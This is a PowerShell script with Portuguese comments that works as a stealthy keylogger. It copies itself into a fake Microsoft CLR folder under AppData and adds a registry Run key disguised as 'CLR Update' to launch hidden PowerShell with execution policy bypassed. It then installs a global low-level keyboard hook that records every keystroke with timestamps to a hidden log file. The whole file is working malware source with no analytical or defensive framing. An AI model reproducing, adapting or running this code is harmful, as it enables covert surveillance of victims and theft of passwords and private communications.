try {
    # 1. Caminho de instalação
    $destFolder = "$env:APPDATA\Microsoft\CLR\Temp"
    $scriptName = "winclr.ps1"
    $destPath = Join-Path $destFolder $scriptName

    if (!(Test-Path $destFolder)) {
        New-Item -ItemType Directory -Path $destFolder -Force | Out-Null
    }

    # 2. Persistência (registro com verificação)
    if ($MyInvocation.MyCommand.Path -ne $destPath) {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $destPath -Force

        $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "CLR Update"
        $regCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$destPath`""
        Set-ItemProperty -Path $regKey -Name $regName -Value $regCmd -ErrorAction SilentlyContinue

        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$destPath`""
        exit
    }

    # 3. Inicializar listener de teclado global (hook low-level)
    Add-Type -Namespace Win32 -Name NativeMethods -MemberDefinition @'
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
'@

    $logPath = "$env:APPDATA\Microsoft\CLR\win_event.log"
    if (!(Test-Path $logPath)) {
        New-Item -Path $logPath -ItemType File -Force | Out-Null
        (Get-Item $logPath).Attributes = 'Hidden'
    }

    $callback = [Win32.NativeMethods+LowLevelKeyboardProc] {
        param ($nCode, $wParam, $lParam)
        if ($nCode -ge 0) {
            $vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
            $time = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            Add-Content -Path $logPath -Value "$time - VK:$vkCode"
        }
        return [Win32.NativeMethods]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
    }

    $moduleHandle = [Win32.NativeMethods]::GetModuleHandle($null)
    $hook = [Win32.NativeMethods]::SetWindowsHookEx(13, $callback, $moduleHandle, 0)

    # 4. Loop invisível mantendo hook ativo
    while ($true) {
        Start-Sleep -Milliseconds 100
    }

} catch {
    Write-Output "[ERRO] $_"
} finally {
    if ($hook) {
        [Win32.NativeMethods]::UnhookWindowsHookEx($hook) | Out-Null
    }
}
